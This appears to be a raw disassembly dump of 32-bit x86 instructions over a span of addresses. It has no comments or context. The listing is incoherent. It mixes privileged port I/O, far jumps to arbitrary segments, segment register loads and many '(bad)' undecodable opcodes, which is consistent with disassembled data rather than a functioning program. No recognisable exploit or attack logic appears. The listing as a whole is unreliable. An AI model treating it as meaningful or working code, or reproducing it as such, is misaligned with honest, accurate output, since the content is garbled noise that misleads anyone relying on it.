  421927:	sbb    eax,0x6e7130a4
  42192c:	add    ch,BYTE PTR [ecx-0x5a]
  42192f:	ror    DWORD PTR [eax+0x7a0e03c2],0xd
  421936:	es push ss
  421938:	push   ebx
  421939:	ss rol ebp,0xe1
  42193d:	popa   
  42193e:	leave  
  42193f:	mov    esi,0x34d4151
  421944:	xchg   ebp,edi
  421946:	out    0xfc,al
  421948:	jle    0x421967
  42194a:	mov    fs,WORD PTR [ebp-0x133007ac]
  421950:	dec    eax
  421951:	ja     0x42190e
  421953:	push   ds
  421954:	jbe    0x42197f
  421956:	dec    ebp
  421957:	or     al,0x50
  421959:	add    BYTE PTR [edx-0x46],ah
  42195c:	idiv   BYTE PTR ds:0x6e93e734
  421962:	call   0x4941:0xe69b2e25
  421969:	mov    dl,0x36
  42196b:	pop    ss
  42196c:	mov    esp,0x2fb6bf7e
  421971:	push   0x9124a6c5
  421976:	push   cs
  421977:	push   cs
  421978:	dec    esi
  421979:	pop    ss
  42197a:	mov    ebx,0xb6dbf94e
  42197f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421980:	cmp    eax,0x30533c2c
  421985:	add    eax,DWORD PTR gs:[edx+0x460bdd39]
  42198c:	pop    ss
  42198d:	int3   
  42198e:	xchg   ebx,edi
  421990:	aas    
  421991:	rcl    ebp,0xf6
  421994:	movaps XMMWORD PTR [ebx*2-0x49805930],xmm3
  42199c:	into   
  42199d:	add    DWORD PTR [esi+0x36],eax
  4219a0:	inc    edx
  4219a1:	not    DWORD PTR [ecx]
  4219a3:	test   BYTE PTR [ebp-0x5e053d8],bh
  4219a9:	inc    ecx
  4219aa:	cdq    
  4219ab:	cmp    cl,BYTE PTR [edx+0x1b51c9e]
  4219b1:	popf   
  4219b2:	daa    
  4219b3:	push   0x1a
  4219b5:	inc    ebx
  4219b6:	shl    DWORD PTR [esi-0x4297f211],cl
  4219bc:	push   0x61
  4219be:	outs   dx,DWORD PTR ds:[esi]
  4219bf:	ret    
  4219c0:	scas   eax,DWORD PTR es:[edi]
  4219c1:	sub    ecx,ebx
  4219c3:	mov    ah,0x62
  4219c5:	not    dl
  4219c7:	sbb    al,0x4c
  4219c9:	inc    eax
  4219ca:	or     edx,esp
  4219cc:	or     BYTE PTR [edi-0x5b],cl
  4219cf:	xlat   BYTE PTR ds:[ebx]
  4219d0:	jmp    0x576b74f3
  4219d5:	push   0xffffffb4
  4219d7:	and    esp,DWORD PTR [eax+0x1d370365]
  4219dd:	jle    0x42199d
  4219df:	push   esp
  4219e0:	dec    esi
  4219e1:	pop    edi
  4219e2:	(bad)  
  4219e3:	mov    ebx,DWORD PTR [esi]
  4219e5:	fnclex 
  4219e7:	aaa    
  4219e8:	out    0xbf,eax
  4219ea:	shl    BYTE PTR es:[ebx],0x59
  4219ee:	cld    
  4219ef:	pusha  
  4219f0:	dec    eax
  4219f1:	and    al,0xdd
  4219f3:	(bad)  
  4219f4:	aad    0x31
  4219f6:	pop    ebp
  4219f7:	lods   al,BYTE PTR ds:[esi]
  4219f8:	xor    DWORD PTR [ebx+ebp*8+0x7ab89424],ecx
  4219ff:	pusha  
  421a00:	into   
  421a01:	int    0x22
  421a03:	xor    eax,0x9e5cf43a
  421a08:	and    dx,ax
  421a0b:	dec    esp
  421a0c:	fs addr16 pop esp
  421a0f:	adc    al,0x48
  421a11:	sbb    DWORD PTR [ecx+0x5c],ecx
  421a14:	and    eax,DWORD PTR [edx+esi*2+0x5133f81b]
  421a1b:	imul   ecx,DWORD PTR [ecx],0x71
  421a1e:	dec    edi
  421a1f:	xchg   esp,eax
  421a20:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421a21:	aam    0xbd
  421a23:	es mov esp,0x8ffe8dcd
  421a29:	cld    
  421a2a:	inc    esp
  421a2b:	sahf   
  421a2c:	lahf   
  421a2d:	cmp    eax,0x92272544
  421a32:	fdivr  QWORD PTR [edi+0x46]
  421a35:	dec    ebx
  421a36:	xchg   ebp,eax
  421a37:	shl    BYTE PTR [esi],1
  421a39:	in     eax,0x23
  421a3b:	pop    ecx
  421a3c:	sbb    cl,BYTE PTR [edx]
  421a3e:	jae    0x4219ee
  421a40:	and    eax,0x18b5382d
  421a45:	mov    bl,0x10
  421a47:	sbb    eax,0x4b5337
  421a4c:	dec    esi
  421a4d:	sbb    BYTE PTR [ebx],0x6f
  421a50:	xor    eax,0x27eccc1f
  421a55:	test   edx,eax
  421a57:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421a58:	stc    
  421a59:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421a5a:	(bad)  
  421a5b:	leave  
  421a5c:	paddq  mm6,QWORD PTR [eax]
  421a5f:	and    ch,BYTE PTR cs:[edx+0x8]
  421a63:	loope  0x421a02
  421a65:	or     eax,0xb4abdb83
  421a6a:	bound  esi,QWORD PTR [edx+0x32]
  421a6d:	cmp    BYTE PTR ds:0x127f4803,bl
  421a73:	dec    esi
  421a74:	repnz imul esi,ecx,0xaa124760
  421a7b:	ins    DWORD PTR es:[edi],dx
  421a7c:	imul   eax,DWORD PTR [ecx-0x6e],0x1f8b23cd
  421a83:	cs push ecx
  421a85:	les    ecx,FWORD PTR [edi+esi*1+0x23b73e6]
  421a8c:	imul   BYTE PTR [esp+edx*4]
  421a8f:	test   BYTE PTR [ecx],dl
  421a91:	std    
  421a92:	jnp    0x421aed
  421a94:	pop    ds
  421a95:	mov    WORD PTR [ebp+ebx*4+0x71],cs
  421a99:	pop    ds
  421a9a:	xchg   esi,eax
  421a9b:	imul   esp,DWORD PTR [ebx+0x59],0xfdae4dca
  421aa2:	mov    dh,0x94
  421aa4:	mov    ebp,0x7f615ae4
  421aa9:	or     eax,eax
  421aab:	cmp    cl,al
  421aad:	fimul  WORD PTR [esi-0x36145774]
  421ab3:	stos   BYTE PTR es:[edi],al
  421ab4:	xchg   esp,eax
  421ab5:	add    ebx,ebp
  421ab7:	xchg   esi,eax
  421ab8:	sub    cl,BYTE PTR [ebp-0x39b62ee9]
  421abe:	shr    BYTE PTR [esi+0x672e30],cl
  421ac4:	sbb    DWORD PTR [ecx+eiz*8+0x71],esi
  421ac8:	xchg   ebp,eax
  421ac9:	in     eax,dx
  421aca:	out    0x7,eax
  421acc:	sti    
  421acd:	mov    edi,0x163d9218
  421ad2:	sar    DWORD PTR ds:[edx+0x2f],cl
  421ad6:	fstp   TBYTE PTR [esp+ecx*1+0x35]
  421ada:	hlt    
  421adb:	or     BYTE PTR [esi-0x66c3644],bl
  421ae1:	ret    
  421ae2:	sbb    esp,ebp
  421ae4:	pop    edi
  421ae5:	imul   esi,DWORD PTR [esp+ebx*8],0x1b
  421ae9:	mov    ecx,0x3e8a5fa5
  421aee:	cmc    
  421aef:	xor    BYTE PTR [eax*2+0x2652429f],ah
  421af6:	pusha  
  421af7:	sbb    ah,0xee
  421afa:	daa    
  421afb:	cmp    eax,0x69ebe1f7
  421b00:	imul   ecx,DWORD PTR [ebx+edx*1+0x55],0x7
  421b05:	mov    BYTE PTR [ecx],0xd
  421b08:	mov    ah,0x99
  421b0a:	or     al,0x23
  421b0c:	in     al,0x1c
  421b0e:	jmp    0x6164:0x39b5e92e
  421b15:	push   ecx
  421b16:	(bad)  
  421b17:	push   0xffffffbf
  421b19:	jmp    0xc2f5:0x202a609d
  421b20:	pop    ss
  421b21:	dec    ebx
  421b22:	sti    
  421b23:	xchg   BYTE PTR [ebp+0x52d1511a],ch
  421b29:	cmp    eax,0x1abe27eb
  421b2e:	cld    
  421b2f:	or     al,0x3d
  421b31:	xchg   esp,eax
  421b32:	cwde   
  421b33:	sar    DWORD PTR [ecx-0x56],1
  421b36:	xchg   ebx,eax
  421b37:	or     eax,0xba2a3104
  421b3c:	repz pop edx
  421b3e:	or     DWORD PTR ds:0x1c635d00,esp
  421b44:	jns    0x421b7e
  421b46:	mov    ecx,0x37f1c2be
  421b4b:	jbe    0x421b82
  421b4d:	imul   esi,DWORD PTR [ecx+0x45],0xaf8b698d
  421b54:	pop    ecx
  421b55:	ret    0x559f
  421b58:	dec    ecx
  421b59:	xchg   esi,eax
  421b5a:	xchg   ah,ah
  421b5c:	sbb    eax,ecx
  421b5e:	dec    ebx
  421b5f:	xor    ch,dh
  421b61:	icebp  
  421b62:	push   ds
  421b63:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421b64:	nop
  421b65:	jl     0x421b2b
  421b67:	xchg   esp,eax
  421b68:	sti    
  421b69:	inc    ebp
  421b6a:	mov    ds:0x653b3daf,eax
  421b6f:	adc    DWORD PTR [ebx+edi*1+0x4a11b4fc],eax
  421b76:	mov    eax,ds:0x99c5d466
  421b7b:	push   es
  421b7c:	jg     0x421bc4
  421b7e:	aaa    
  421b7f:	mov    dl,0x2f
  421b81:	enter  0x4769,0x63
  421b85:	aad    0x37
  421b87:	dec    edx
  421b88:	sbb    edx,eax
  421b8a:	mov    eax,0x86581cab
  421b8f:	mov    dh,0x97
  421b91:	mov    bh,0xdf
  421b93:	sar    BYTE PTR [eax+0x386c29aa],1
  421b99:	cmp    eax,DWORD PTR [edx]
  421b9b:	mov    cl,0xc8
  421b9d:	sar    BYTE PTR ds:0x970dae05,cl
  421ba3:	adc    al,0xa7
  421ba5:	(bad)  
  421ba6:	cli    
  421ba7:	in     eax,dx
  421ba8:	js     0x421b74
  421baa:	dec    ebx
  421bab:	cmp    eax,0xbd18c3a7
  421bb0:	xchg   DWORD PTR [ebp-0x25],esp
  421bb3:	adc    BYTE PTR [ecx],dh
  421bb5:	pop    eax
  421bb6:	js     0x421b74
  421bb8:	sub    BYTE PTR [ecx+ebx*1+0xc799c40],bl
  421bbf:	hlt    
  421bc0:	pop    ebp
  421bc1:	(bad)  
  421bc2:	out    0x77,al
  421bc4:	fnstsw WORD PTR [esp+ebx*4+0x15eaae6a]
  421bcb:	inc    ebx
  421bcd:	(bad)  
  421bce:	fwait
  421bcf:	cld    
  421bd0:	dec    ecx
  421bd1:	push   edx
  421bd2:	jno    0x421c48
  421bd4:	or     BYTE PTR [edx-0x50],al
  421bd7:	inc    ecx
  421bd8:	push   ebx
  421bd9:	(bad)  
  421bdb:	outs   dx,DWORD PTR ds:[esi]
  421bdc:	pop    ss
  421bdd:	rcl    bh,1
  421bdf:	jne    0x421bff
  421be1:	cmp    esp,DWORD PTR [edi]
  421be3:	and    esp,DWORD PTR ds:0x4f66cc35
  421be9:	scas   al,BYTE PTR es:[edi]
  421bea:	mov    ebp,DWORD PTR [edi]
  421bec:	push   cs
  421bed:	cmp    ecx,esp
  421bef:	popa   
  421bf0:	test   al,0x69
  421bf2:	cmp    eax,esi
  421bf4:	cdq    
  421bf5:	in     eax,0x37
  421bf7:	push   es
  421bf8:	pop    ebp
  421bf9:	pop    ebp
  421bfa:	sbb    esi,DWORD PTR [esi-0x66]
  421bfd:	adc    DWORD PTR [edi-0x5b],0x6
  421c01:	inc    edi
  421c02:	jnp    0x421c62
  421c04:	rcr    DWORD PTR [edx],cl
  421c06:	in     eax,dx
  421c07:	mov    eax,0xd541b652
  421c0c:	mov    dh,0xb5
  421c0e:	stos   BYTE PTR es:[edi],al
  421c0f:	test   DWORD PTR [edi],0xa9bf2842
  421c15:	mov    ch,0x7b
  421c17:	outs   dx,BYTE PTR ds:[esi]
  421c18:	in     eax,dx
  421c19:	int3   
  421c1a:	test   al,0xa
  421c1c:	lods   al,BYTE PTR ds:[esi]
  421c1d:	jmp    0x2f29:0xa53e860e
  421c24:	imul   BYTE PTR [ecx]
  421c26:	shl    cl,cl
  421c28:	shr    BYTE PTR [ebx-0x641d1d6a],0x14
  421c2f:	push   0xffffffb4
  421c31:	inc    eax
  421c32:	xchg   ebp,eax
  421c33:	shl    DWORD PTR [bx],0xe7
  421c37:	je     0x421bd1
  421c39:	and    dh,bh
  421c3b:	push   ebx
  421c3c:	out    dx,eax
  421c3d:	sub    al,0x1a
  421c3f:	les    edi,FWORD PTR [esi]
  421c41:	test   BYTE PTR [edi+0x34],dh
  421c44:	jecxz  0x421c1c
  421c46:	add    al,BYTE PTR [ecx]
  421c48:	in     al,0x7b
  421c4a:	push   eax
  421c4b:	int3   
  421c4c:	and    BYTE PTR [edi-0x6f],ah
  421c4f:	jg     0x421c43
  421c51:	jmp    0xc96306b3
  421c56:	inc    esp
  421c57:	(bad)  
  421c58:	cli    
  421c59:	pop    edx
  421c5a:	mov    ebp,0xfd65d645
  421c5f:	pop    esi
  421c60:	and    DWORD PTR [esi+0x3f251e30],esi
  421c66:	pop    edi
  421c67:	int3   
  421c68:	jbe    0x421c11
  421c6a:	cwde   
  421c6b:	pop    ebp
  421c6c:	push   eax
  421c6d:	inc    esi
  421c6e:	aaa    
  421c6f:	xlat   BYTE PTR ds:[ebx]
  421c70:	cmp    bl,BYTE PTR [eax+ebp*8+0x51]
  421c74:	pushf  
  421c75:	or     edx,ebx
  421c77:	outs   dx,BYTE PTR ds:[esi]
  421c78:	int    0xb6
  421c7a:	jb     0x421c5e
  421c7c:	push   esp
  421c7d:	(bad)  
  421c7f:	jp     0x421cec
  421c81:	mov    esi,edx
  421c83:	ror    BYTE PTR [edi+0x3b],0x2b
  421c87:	test   DWORD PTR [edx+eax*4-0x784ca44b],0x32551b5a
  421c92:	push   esi
  421c93:	aas    
  421c94:	mov    ah,BYTE PTR [esi-0xdf50636]
  421c9a:	(bad)  
  421c9c:	inc    edx
  421c9d:	sub    bh,BYTE PTR [ecx+ecx*8-0x31]
  421ca1:	mov    al,BYTE PTR [ebx+edi*2+0x1a5fdac5]
  421ca8:	xchg   ecx,eax
  421ca9:	ins    BYTE PTR es:[edi],dx
  421caa:	fdiv   st,st(7)
  421cac:	pop    DWORD PTR [edi]
  421cae:	hlt    
  421caf:	shl    dl,cl
  421cb1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421cb2:	retf   0xfced
  421cb5:	and    al,0xab
  421cb7:	mov    eax,DWORD PTR [ecx+0x38fb30a5]
  421cbd:	sub    ecx,DWORD PTR [ebx+0x3]
  421cc0:	call   FWORD PTR [esi]
  421cc2:	push   eax
  421cc3:	popf   
  421cc4:	pop    esi
  421cc5:	pusha  
  421cc6:	pushf  
  421cc7:	or     dh,ch
  421cc9:	xor    edx,DWORD PTR [esi+ecx*4]
  421ccc:	add    esi,ecx
  421cce:	cmp    BYTE PTR [edi-0x19],bl
  421cd1:	ficomp DWORD PTR [edx+esi*2-0x3451a671]
  421cd8:	pop    edi
  421cd9:	push   esi
  421cda:	lock mov ds:0xcdc7eb89,eax
  421ce0:	out    0x7d,eax
  421ce2:	imul   esi,DWORD PTR [esi-0x534b0c86],0x30
  421ce9:	sbb    eax,0xc8ac2273
  421cee:	es ror dh,0x2e
  421cf2:	outs   dx,BYTE PTR ds:[esi]
  421cf3:	fbstp  TBYTE PTR [edi+0xf]
  421cf6:	sbb    eax,0x5ca0b4d6
  421cfb:	sub    eax,0x231dba0
  421d00:	popa   
  421d01:	sub    BYTE PTR [ebx+0x26],ah
  421d04:	in     al,0xa0
  421d06:	or     dl,bl
  421d08:	and    eax,0xd830610b
  421d0d:	jp     0x421d3b
  421d0f:	scas   eax,DWORD PTR es:[edi]
  421d10:	adc    dl,BYTE PTR [ebx+edx*1]
  421d13:	inc    eax
  421d14:	jl     0x421d87
  421d16:	dec    edi
  421d17:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421d18:	lea    ecx,[ebp-0x1]
  421d1b:	(bad)  
  421d1c:	outs   dx,DWORD PTR ds:[esi]
  421d1d:	pop    esp
  421d1e:	push   ebx
  421d1f:	icebp  
  421d20:	rcl    cl,0x9a
  421d23:	dec    esp
  421d24:	xchg   edx,eax
  421d25:	call   0x1c44ed15
  421d2a:	xor    BYTE PTR [edx],bl
  421d2c:	xchg   BYTE PTR [esi+0x3edb0cdc],cl
  421d32:	xchg   ebp,eax
  421d33:	mov    al,0x96
  421d35:	imul   ebx,DWORD PTR [eax-0x17],0x49
  421d39:	loopne 0x421d72
  421d3b:	cdq    
  421d3c:	jg     0x421d55
  421d3e:	out    0x29,eax
  421d40:	scas   eax,DWORD PTR es:[edi]
  421d41:	(bad)  
  421d42:	pusha  
  421d43:	popa   
  421d44:	aam    0xa0
  421d46:	or     ecx,esi
  421d48:	lds    edx,FWORD PTR ds:0xe9ba4966
  421d4e:	xor    BYTE PTR [esi],dl
  421d50:	xchg   ecx,eax
  421d51:	in     al,0x81
  421d53:	int3   
  421d54:	jo     0x421d3e
  421d56:	sub    eax,0x603074
  421d5b:	xchg   edx,eax
  421d5c:	repz mov dh,0x9e
  421d5f:	and    esi,esp
  421d61:	xchg   ebx,eax
  421d62:	das    
  421d63:	jae    0x421d48
  421d65:	cmp    BYTE PTR [eax+0x5],0x9c
  421d69:	ins    DWORD PTR es:[edi],dx
  421d6a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421d6b:	cmp    eax,0xc6a8ffb2
  421d70:	shl    DWORD PTR [ecx-0x14],1
  421d73:	push   edx
  421d74:	lock sbb ebx,ebp
  421d77:	sub    eax,0xe2a1ef6c
  421d7c:	enter  0xe6e,0xe6
  421d80:	jns    0x421d30
  421d82:	push   ebp
  421d83:	inc    eax
  421d84:	or     ebp,DWORD PTR [edi]
  421d86:	jne    0x421d6f
  421d88:	in     al,0xca
  421d8a:	mov    bl,0xe0
  421d8c:	call   0x5bdef515
  421d91:	and    eax,eax
  421d93:	add    eax,0x5f82c79f
  421d98:	test   BYTE PTR [ecx+0x214c337a],0xc0
  421d9f:	mov    eax,ds:0x20ee1b5
  421da4:	ror    DWORD PTR [eax-0x4c80e2a2],0x41
  421dab:	jp     0x421d36
  421dad:	mov    ecx,0x913c9a08
  421db2:	iret   
  421db3:	or     esp,DWORD PTR [edx]
  421db5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421db6:	cmp    BYTE PTR [ecx-0x30af3ece],dl
  421dbc:	(bad)  
  421dbe:	leave  
  421dbf:	adc    ebx,DWORD PTR [ecx]
  421dc1:	dec    eax
  421dc2:	imul   edi,ebx,0x5cedf835
  421dc8:	into   
  421dc9:	shl    DWORD PTR [edi],0x90
  421dcc:	xchg   ebp,eax
  421dcd:	sbb    ah,bl
  421dcf:	ret    0xa243
  421dd2:	div    BYTE PTR [ebx]
  421dd4:	push   edi
  421dd5:	std    
  421dd6:	pusha  
  421dd7:	adc    edi,DWORD PTR [ebx-0x1c]
  421dda:	add    eax,0x8d7d992f
  421ddf:	ins    DWORD PTR es:[edi],dx
  421de0:	push   edi
  421de1:	aaa    
  421de2:	jmp    0x476b916e
  421de7:	adc    BYTE PTR [ebx-0x73c302de],cl
  421ded:	inc    ecx
  421dee:	jne    0x421e50
  421df0:	in     al,0x6f
  421df2:	call   0x1a4396e1
  421df7:	mov    cl,0xa6
  421df9:	jecxz  0x421dd1
  421dfb:	pop    edx
  421dfc:	and    al,0xd8
  421dfe:	repz aam 0x80
  421e01:	fist   WORD PTR [esi]
  421e03:	and    esp,eax
  421e05:	add    al,0x3b
  421e07:	pop    ebx
  421e08:	mov    ds:0x83d91714,eax
  421e0d:	cmp    bl,ch
  421e0f:	aaa    
  421e10:	add    dl,ah
  421e12:	rcl    DWORD PTR [esi-0x7e],cl
  421e15:	mov    ebx,DWORD PTR [edx+0x2aefaafe]
  421e1b:	imul   dl
  421e1d:	mov    dl,0xa6
  421e1f:	(bad)  [edx]
  421e21:	aam    0xf6
  421e23:	ss pop es
  421e25:	xchg   ebx,eax
  421e26:	gs mov dh,0x85
  421e29:	sbb    BYTE PTR [edi+0x6c],cl
  421e2c:	in     al,0x48
  421e2e:	pop    ebx
  421e2f:	(bad)  
  421e30:	xor    eax,0x3bb883ba
  421e35:	and    DWORD PTR fs:[ebp+0x51c5aa21],eax
  421e3c:	test   DWORD PTR fs:[edi+0x77],0x96c763e7
  421e44:	dec    ecx
  421e45:	xlat   BYTE PTR ds:[ebx]
  421e46:	ins    BYTE PTR es:[edi],dx
  421e47:	or     eax,0xcdc28195
  421e4c:	mov    BYTE PTR [ecx+0x12e7dc10],bl
  421e52:	int3   
  421e53:	and    eax,0x5841839e
  421e58:	(bad)  
  421e59:	lds    eax,FWORD PTR [ecx-0x12980003]
  421e5f:	mov    esp,DWORD PTR [ecx+eiz*8-0x143899e7]
  421e66:	mov    DWORD PTR [edx],esp
  421e68:	jae    0x421e0f
  421e6a:	outs   dx,BYTE PTR ds:[esi]
  421e6b:	sub    esi,DWORD PTR [ebx+edi*1-0x7f]
  421e6f:	add    DWORD PTR [esi-0x1073c779],0x7b90a50f
  421e79:	fwait
  421e7a:	push   ss
  421e7b:	cmp    esp,DWORD PTR [ebx-0x2]
  421e7e:	adc    DWORD PTR [eax+edi*2-0x60],eax
  421e82:	(bad)  
  421e83:	cmc    
  421e84:	enter  0xace5,0x74
  421e88:	pop    edi
  421e89:	scas   eax,DWORD PTR es:[edi]
  421e8a:	pop    eax
  421e8b:	pop    esp
  421e8c:	jnp    0x421e48
  421e8e:	stc    
  421e8f:	imul   edx,DWORD PTR [edx+0x4db8d68b],0xffffffef
  421e96:	(bad)  
  421e97:	jmp    0x421eda
  421e99:	inc    eax
  421e9a:	mov    gs,WORD PTR [edi+0x57cdffab]
  421ea0:	lahf   
  421ea1:	idiv   DWORD PTR [ebp-0x4cc6e7c7]
  421ea7:	data16 jb 0x421e76
  421eaa:	inc    esp
  421eab:	ds push ds
  421ead:	sub    edi,esi
  421eaf:	mov    cl,0x3f
  421eb1:	or     eax,0x971d6a86
  421eb6:	mov    WORD PTR [ebx+0x12],fs
  421eb9:	xchg   DWORD PTR es:[ebp+0x67b888ca],ecx
  421ec0:	mov    edi,0x3fa9d367
  421ec5:	gs ret 0x4fa6
  421ec9:	lock mov bl,0xf6
  421ecc:	or     al,0x32
  421ece:	(bad)  
  421ecf:	in     eax,dx
  421ed0:	mov    DWORD PTR [esi+0x5dfbd40f],eax
  421ed6:	push   ss
  421ed7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421ed8:	dec    ecx
  421ed9:	jecxz  0x421e8d
  421edb:	ret    
  421edc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421edd:	jge    0x421ea1
  421edf:	xchg   DWORD PTR [eax],ecx
  421ee1:	mov    eax,ds:0xd165b1bb
  421ee6:	(bad)
  421ee9:	das    
  421eea:	xchg   edx,eax
  421eeb:	mov    ebp,0xb89f41f5
  421ef0:	cld    
  421ef1:	sub    al,0x85
  421ef3:	cwde   
  421ef4:	xor    dl,BYTE PTR [bx]
  421ef7:	retf   
  421ef8:	mov    edi,0xb34468cb
  421efd:	add    dl,BYTE PTR [esi]
  421eff:	dec    ecx
  421f00:	and    DWORD PTR [eax],0x74
  421f03:	fdiv   DWORD PTR [edi]
  421f05:	xchg   edx,eax
  421f06:	jno    0x421f35
  421f08:	mov    dh,0x1d
  421f0a:	loopne 0x421edd
  421f0c:	cmp    BYTE PTR [eax+0x42],dh
  421f0f:	repnz test al,0xfb
  421f12:	add    bh,ah
  421f14:	test   eax,0x10eaa903
  421f19:	fcmovne st,st(5)
  421f1b:	jmp    DWORD PTR [edx-0xb]
  421f1e:	push   ss
  421f1f:	dec    eax
  421f20:	push   0x19
  421f22:	mov    esp,0xfc0b51b7
  421f27:	cdq    
  421f28:	adc    al,0x21
  421f2a:	outs   dx,BYTE PTR ds:[esi]
  421f2b:	aam    0x47
  421f2d:	push   0xfabdf0e8
  421f32:	(bad)  
  421f33:	ror    BYTE PTR [eax+0x137d1265],1
  421f39:	mov    al,ds:0x6a5b6b02
  421f3e:	mov    ebx,0x3c85353a
  421f43:	xor    eax,0xc6a7824d
  421f48:	push   edi
  421f49:	es jl  0x421f20
  421f4c:	or     esi,eax
  421f4e:	stos   DWORD PTR es:[edi],eax
  421f4f:	rol    BYTE PTR [ebx+0x5f],cl
  421f52:	or     eax,0xffffff84
  421f55:	dec    ecx
  421f56:	neg    ebx
  421f58:	adc    eax,0xdf69d67
  421f5d:	add    eax,0x62a38cd1
  421f62:	dec    eax
  421f63:	jge    0x421f0c
  421f65:	sbb    BYTE PTR [esi],0x38
  421f68:	jno    0x421efa
  421f6a:	cs ins DWORD PTR es:[edi],dx
  421f6c:	pushf  
  421f6d:	mov    ecx,0x741173d7
  421f72:	push   ebx
  421f73:	jl     0x421fcb
  421f75:	(bad)  
  421f76:	jmp    0x1056d26f
  421f7b:	and    BYTE PTR [ecx+0x43],ah
  421f7e:	test   DWORD PTR [ebx+ebx*8+0x53],ebp
  421f82:	lahf   
  421f83:	jns    0x421fff
  421f85:	in     eax,dx
  421f86:	mov    al,ds:0xf874ab0f
  421f8b:	retf   0x81ad
  421f8e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421f8f:	lea    esi,[edx+eax*2]
  421f92:	aaa    
  421f93:	retf   
  421f94:	dec    edi
  421f95:	lock dec ebp
  421f97:	fisubr DWORD PTR [ebp+0x53a52077]
  421f9d:	pop    esi
  421f9e:	add    BYTE PTR [ebx+0x2b],dh
  421fa1:	push   edi
  421fa2:	push   ds
  421fa3:	pop    ebp
  421fa4:	(bad)  
  421fa6:	mov    BYTE PTR [edx+eax*2+0x67],al
  421faa:	sti    
  421fab:	call   0x951b90b7
  421fb0:	mov    ecx,0x43077d29
  421fb5:	mov    cl,0xc9
  421fb7:	scas   al,BYTE PTR es:[edi]
  421fb8:	add    al,0x45
  421fba:	sub    BYTE PTR [edx-0x29],bl
  421fbd:	jno    0x421fa7
  421fbf:	xchg   ecx,eax
  421fc0:	mov    WORD PTR [ecx-0x55028cad],cs
  421fc6:	xchg   cl,bl
  421fc8:	gs dec eax
  421fca:	mov    eax,ds:0x66657b61
  421fcf:	lock xchg esi,eax
  421fd1:	mov    WORD PTR [edi-0x5fbc37c3],ss
  421fd7:	adc    esp,0xfffffff2
  421fda:	xchg   ebp,eax
  421fdb:	mov    ah,0xc9
  421fdd:	test   BYTE PTR [esp+eax*8-0x43],0x7f
  421fe2:	mov    ah,0x47
  421fe4:	bound  edi,QWORD PTR [edx+0x48aeb6d4]
  421fea:	fucomip st,st(3)
  421fec:	cmp    ebp,edx
  421fee:	or     bh,0x5d
  421ff1:	fiadd  WORD PTR [esi+edi*1+0x5d]
  421ff5:	div    DWORD PTR [ebp+0x46309092]
  421ffb:	jle    0x421fb0
  421ffd:	out    0x11,al
  421fff:	(bad)  
  422000:	push   ebp
  422001:	or     bh,dl
  422003:	mov    esp,0x76e3f0e2
  422008:	xor    al,0x86
  42200a:	(bad)  
  42200c:	xchg   DWORD PTR [ebx+0x6def0b35],eax
  422012:	pop    eax
  422013:	cmc    
  422014:	dec    ecx
  422015:	sub    DWORD PTR [eax],0xffffffa6
  422018:	nop
  422019:	and    eax,0x39f5cf04
  42201e:	push   ebx
  42201f:	cmp    al,0x46
  422021:	push   0x12bd6c12
  422026:	sub    al,0x5e
  422028:	sbb    BYTE PTR [edx],0x82
  42202b:	(bad)  
  42202c:	sti    
  42202d:	xchg   ebp,eax
  42202e:	out    0x8c,eax
  422030:	mov    ds:0x2c73903d,eax
  422035:	(bad)  
  422037:	fidiv  WORD PTR [edi+0x1a2fceeb]
  42203d:	jp     0x422047
  42203f:	adc    DWORD PTR [ebx],ebx
  422041:	inc    edx
  422042:	neg    BYTE PTR ds:0x682c17ab
  422048:	jae    0x42206e
  42204a:	cmp    esi,DWORD PTR [ebp-0x53]
  42204d:	inc    ecx
  42204e:	call   0x52de:0xcfe7097b
  422055:	repnz aas 
  422057:	or     eax,0xdfb6c4fb
  42205c:	mov    gs,WORD PTR [ecx]
  42205e:	inc    ecx
  42205f:	das    
  422060:	imul   eax,ebp,0x49
  422063:	pop    ebx
  422064:	cmp    bl,BYTE PTR [esi+0x60]
  422067:	jnp    0x422028
  422069:	adc    ch,BYTE PTR [eax-0x36]
  42206c:	cli    
  42206d:	or     bl,BYTE PTR [edi-0x239b086d]
  422073:	dec    ebx
  422074:	push   esi
  422075:	pop    ebx
  422076:	fs aam 0xa3
  422079:	int3   
  42207a:	call   0xaa93c249
  42207f:	dec    ecx
  422080:	mov    ecx,0x2ed3b120
  422085:	sub    DWORD PTR [bp+0x6777],0x3334315f
  42208e:	mov    DWORD PTR [edi+eax*4],ecx
  422091:	xlat   BYTE PTR ds:[ebx]
  422092:	js     0x42208d
  422094:	mov    eax,0xa6c72ce0
  422099:	mov    bl,0xac
  42209b:	mov    bh,0xc9
  42209d:	sbb    edx,DWORD PTR [ebx+edx*4-0x61]
  4220a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4220a2:	in     al,dx
  4220a3:	inc    DWORD PTR [ecx-0x6d25dd4e]
  4220a9:	adc    ch,dh
  4220ab:	sbb    bl,ch
  4220ad:	mov    edx,0x7639dafd
  4220b2:	sahf   
  4220b3:	and    DWORD PTR [ebp+0x7eddb042],0xc47b00c7
  4220bd:	dec    esi
  4220be:	inc    edx
  4220bf:	fstp   TBYTE PTR [esi]
  4220c1:	out    dx,al
  4220c2:	xchg   ecx,edx
  4220c4:	pop    ebx
  4220c5:	push   ebx
  4220c6:	mov    ebp,0xd885027d
  4220cb:	retf   0xffd5
  4220ce:	push   0x2fc4133b
  4220d3:	mov    ecx,0x917896c5
  4220d8:	mov    al,0xee
  4220da:	jnp    0x4220aa
  4220dc:	cmp    al,0x17
  4220de:	push   edi
  4220df:	dec    ecx
  4220e0:	and    DWORD PTR [edx+ecx*8+0x7bf3c12f],ebp
  4220e7:	cmp    eax,0xbdc1b05c
  4220ec:	fs jb  0x422164
  4220ef:	sti    
  4220f0:	je     0x422098
  4220f2:	sbb    DWORD PTR [edx],edi
  4220f4:	retf   
  4220f5:	sub    al,0x33
  4220f7:	cld    
  4220f8:	hlt    
